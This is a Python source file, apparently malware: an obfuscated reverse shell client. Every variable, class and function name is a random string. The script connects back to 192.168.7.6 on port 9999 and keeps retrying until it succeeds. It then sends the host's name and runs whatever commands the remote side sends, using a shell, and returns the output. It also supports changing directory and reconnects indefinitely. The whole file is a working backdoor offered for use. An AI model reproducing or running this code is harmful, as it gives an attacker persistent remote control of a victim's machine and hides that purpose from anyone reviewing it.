import os as dhfghfduihgfduy5859488954
import socket as fgfgfhfhfhfghg
import subprocess as dfighfdhifhiofgd
import time as fdshfgdsgdsgdsgdsfigds
import signal as ufdhufdghfuigywgaeygdsygdf
import sys as fdghdfuhgfduyy4578
import struct as dudfhuhdfuhdfuhduhfdud

class dsfufdsuyh48:
    def __init__(self):
        self.fdjgfdhgufdgj94 = "192.168.7.6"
        self.dfygfdgfduyg7457yfudghufdhbf = 9999
        self.jfdighfdjhg8fdfjd = None
    def hdfuhg566767ufdhgudh(self):
        ufdhufdghfuigywgaeygdsygdf.signal(ufdhufdghfuigywgaeygdsygdf.SIGINT, self.dhfuhugfj94950i983)
        ufdhufdghfuigywgaeygdsygdf.signal(ufdhufdghfuigywgaeygdsygdf.SIGTERM, self.dhfuhugfj94950i983)
    def dhfuhugfj94950i983(self, signal_received=None, frame=None):
        if self.jfdighfdjhg8fdfjd:
            try:
                self.jfdighfdjhg8fdfjd.shutdown(fgfgfhfhfhfghg.SHUT_RDWR)
                self.jfdighfdjhg8fdfjd.close()
            except OSError:
                pass
        fdghdfuhgfduyy4578.exit(0)
    def gfdhguhughdfuhugdhuhf(self):
        while True:
            try:
                self.jfdighfdjhg8fdfjd = fgfgfhfhfhfghg.socket()
                self.jfdighfdjhg8fdfjd.connect((self.fdjgfdhgufdgj94, self.dfygfdgfduyg7457yfudghufdhbf))
                ugdfgfygsdyt3643tudfghufg = fgfgfhfhfhfghg.gethostname()
                self.jfdighfdjhg8fdfjd.send(ugdfgfygsdyt3643tudfghufg.encode())
                break
            except OSError:
                fdshfgdsgdsgdsgdsfigds.sleep(5)
    def hdfugdfggfdguhdufhudf(self, jusdfgfyg74567454):
        sdfhfdgygdgsugdugdgfgd = dhfghfduihgfduy5859488954.getcwd()
        sdsfuhudfssdggsdgdsgds = f"{jusdfgfyg74567454}{sdfhfdgygdgsugdugdgfgd} > "
        self.jfdighfdjhg8fdfjd.send(dudfhuhdfuhdfuhduhfdud.pack('>I', len(sdsfuhudfssdggsdgdsgds)) +
                                    sdsfuhudfssdggsdgdsgds.encode())
    def dhgfdhghdhgdfhu4e98453239884(self):
        while True:
            try:
                fhufdhufhuhfduhdfuhfdu = self.jfdighfdjhg8fdfjd.recv(20480)
                if not fhufdhufhuhfduhdfuhfdu:
                    break
                if fhufdhufhuhfduhdfuhfdu[:2].decode("utf-8") == 'cd':
                    fdusdgdsu4r8784hjdfhuhgfufgd = fhufdhufhuhfduhdfuhfdu[3:].decode("utf-8").strip()
                    try:
                        dhfghfduihgfduy5859488954.chdir(fdusdgdsu4r8784hjdfhuhgfufgd)
                        self.hdfugdfggfdguhdufhudf("")
                    except Exception as fdhufdghfdughudfhugf:
                        self.hdfugdfggfdguhdufhudf(f"Directory change failed: {fdhufdghfdughudfhugf}\n")
                elif fhufdhufhuhfduhdfuhfdu.decode("utf-8") == "quit":
                    break
                else:
                    self.dfhhgfdhuh5eu857844334584(fhufdhufhuhfduhdfuhfdu.decode("utf-8"))
            except OSError:
                break
        self.jfdighfdjhg8fdfjd.close()
    def dfhhgfdhuh5eu857844334584(self, fdhfduhfudgh7dy475y34uhufd):
        fguhfgduhfhguhu484584758 = dfighfdhifhiofgd.Popen(fdhfduhfudgh7dy475y34uhufd, shell=True,
                                                          stdout=dfighfdhifhiofgd.PIPE, stderr=dfighfdhifhiofgd.PIPE,
                                                          stdin=dfighfdhifhiofgd.PIPE)
        fugfdsyg47745745, jhudfhufdy7467645 = fguhfgduhfhguhu484584758.communicate()
        hfdufuhgufdfudgy7445 = fugfdsyg47745745.decode("utf-8", "replace")
        gfdfgudfuudfhfudgy745745 = jhudfhufdy7467645.decode("utf-8", "replace")
        self.hdfugdfggfdguhdufhudf(hfdufuhgufdfudgy7445 + gfdfgudfuudfhfudgy745745)
def jdghfdughfd7y47845784():
    uhufdhudf87547584785 = dsfufdsuyh48()
    uhufdhudf87547584785.hdfuhg566767ufdhgudh()
    while True:
        uhufdhudf87547584785.gfdhguhughdfuhugdhuhf()
        uhufdhudf87547584785.dhgfdhghdhgdfhu4e98453239884()
if __name__ == '__main__':
    jdghfdughfd7y47845784()
